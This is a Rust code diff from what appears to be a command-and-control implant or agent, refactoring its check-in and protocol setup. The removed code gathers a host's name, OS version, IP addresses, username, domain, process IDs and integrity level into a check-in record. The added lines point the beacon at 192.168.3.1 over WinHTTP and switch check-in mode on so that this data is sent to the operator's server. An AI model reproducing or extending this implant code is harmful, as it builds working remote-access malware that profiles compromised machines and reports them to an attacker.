@@ -1,30 +1,15 @@
-use core::ffi::c_void;
-use libc_print::{libc_eprintln, libc_println};
-use rs2_runtime::Runtime;
-
 use alloc::sync::Arc;
+use core::ffi::c_void;
+use libc_print::libc_eprintln;
+
+use rs2_runtime::Runtime;
 
 use mod_agentcore::{instance, instance_mut};
 
-use mod_win32::{
-    nt_get_adapters_info::get_adapters_info,
-    nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
-    nt_peb::{
-        get_image_path_name, get_os, get_os_version_info, get_process_name, get_user_domain,
-        get_username,
-    },
-    nt_ps_api::{get_pid_and_ppid, get_process_integrity},
-};
-
 use rs2_communication_protocol::protocol::Protocol;
-use rs2_communication_protocol::{
-    communication_structs::checkin::{Checkin, PartialCheckin},
-    metadata::Metadata,
-};
+use rs2_communication_protocol::sender::Sender;
 
 use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
-
-use crate::handler::{encryptor_from_raw, protocol_from_raw};
 
 #[cfg(feature = "protocol-json")]
 use mod_protocol_json::protocol::JsonProtocol;
@@ -32,88 +17,10 @@ use mod_protocol_json::protocol::JsonProtocol;
 #[cfg(feature = "protocol-winhttp")]
 use mod_protocol_winhttp::protocol::WinHttpProtocol;
 
-/// Gathers and initializes metadata such as computer name, OS info, IP addresses, etc.
-pub fn init_checkin_data() {
-    unsafe {
-        // Get the computer name in DNS Hostname format
-        let mut buffer = Vec::new();
-        let mut size: u32 = 0;
-        let success = get_computer_name_ex(
-            ComputerNameFormat::ComputerNameDnsHostname,
-            &mut buffer,
-            &mut size,
-        );
-
-        let mut hostname = String::new();
-        if success {
-            // Convert the computer name to a String
-            hostname = String::from_utf16_lossy(&buffer)
-                .trim_end_matches('\0')
-                .to_string();
-        } else {
-            libc_println!("[!] get_computer_name_ex failed");
-        }
-
-        // Get the operating system information
-        let os_info_peb = get_os();
-        let get_os_version_info_result = get_os_version_info();
-        let mut operating_system = String::new();
-        if get_os_version_info_result.is_ok() {
-            let os_version_info = get_os_version_info_result.unwrap();
-
-            // Construct the operating system information string
-            operating_system.push_str(&format!(
-                "{} {}.{}.{} (Platform ID: {})",
-                os_info_peb,
-                os_version_info.dw_major_version,
-                os_version_info.dw_minor_version,
-                os_version_info.dw_build_number,
-                os_version_info.dw_platform_id,
-            ));
-        }
-
-        // Get network adapters information
-        let ip_addresses = get_adapters_info();
-
-        // Get the process ID and parent process ID
-        let (pid, ppid) = get_pid_and_ppid();
-
-        // Get the integrity level of the process
-        let process_handle = -1isize as _;
-        let rid = get_process_integrity(process_handle);
-
-        let first_ip = ip_addresses.unwrap().get_mut(0).unwrap().1.clone();
-        // Create a Checkin object with the gathered metadata
-        let mut checkin = Box::new(Checkin::new(PartialCheckin {
-            operative_system: operating_system,
-            hostname: hostname,
-            domain: get_user_domain(),
-            username: get_username(),
-            ip: first_ip,
-            process_id: pid as i64,
-            parent_process_id: ppid as i64,
-            process_name: get_process_name(),
-            integrity_level: rid,
-            cwd: get_image_path_name(),
-        }));
-
-        // Add metadata to the Checkin object
-        let metadata = Metadata {
-            request_id: "an3a8hlnrr4638d30yef0oz5sncjdx5v".to_string(),
-            command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
-            agent_id: "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
-            path: None,
-        };
-
-        checkin.with_metadata(metadata);
-
-        // Set the Checkin data in the global instance
-        instance_mut().set_checkin_data(Box::into_raw(checkin) as *mut c_void);
-    }
-}
+use super::system_data::checkin_from_raw;
 
 /// Initializes the communication protocol and attempts to connect to the server.
-pub fn init_protocol<R>(rt: Arc<R>)
+pub fn initialize_protocol<R>(rt: Arc<R>)
 where
     R: Runtime,
 {
@@ -190,7 +97,7 @@ where
     {
         let boxed_encryptor = Box::new(IdentEncryptor);
         let boxed_protocol: Box<WinHttpProtocol<IdentEncryptor>> =
-            Box::new(WinHttpProtocol::new("http://localhost:80".to_string()));
+            Box::new(WinHttpProtocol::new("http://192.168.3.1:80".to_string()));
 
         unsafe {
             instance_mut().session.encryptor_ptr = Box::into_raw(boxed_encryptor) as *mut c_void;
@@ -207,7 +114,7 @@ where
                 let checkin_data = checkin_from_raw(checkin_ptr);
 
                 // Set the protocol to checkin mode
-                // protocol.set_is_checkin(true);
+                protocol.set_is_checkin(true);
 
                 // Attempt to write the Checkin data using the protocol
                 rt.block_on(async move {
@@ -254,7 +161,19 @@ where
     }
 }
 
-/// Function to retrieve a mutable reference to a Checkin struct from a raw pointer.
-pub unsafe fn checkin_from_raw(ptr: *mut c_void) -> &'static mut Checkin {
-    &mut *(ptr as *mut Checkin)
+#[cfg(feature = "protocol-json")]
+/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
+pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut JsonProtocol<IdentEncryptor> {
+    &mut *(ptr as *mut JsonProtocol<IdentEncryptor>)
+}
+
+#[cfg(feature = "protocol-winhttp")]
+/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
+pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut WinHttpProtocol<IdentEncryptor> {
+    &mut *(ptr as *mut WinHttpProtocol<IdentEncryptor>)
+}
+
+/// Function to retrieve a mutable reference to a IdentEncryptor struct from a raw pointer.
+pub unsafe fn encryptor_from_raw(ptr: *mut c_void) -> &'static mut IdentEncryptor {
+    &mut *(ptr as *mut IdentEncryptor)
 }
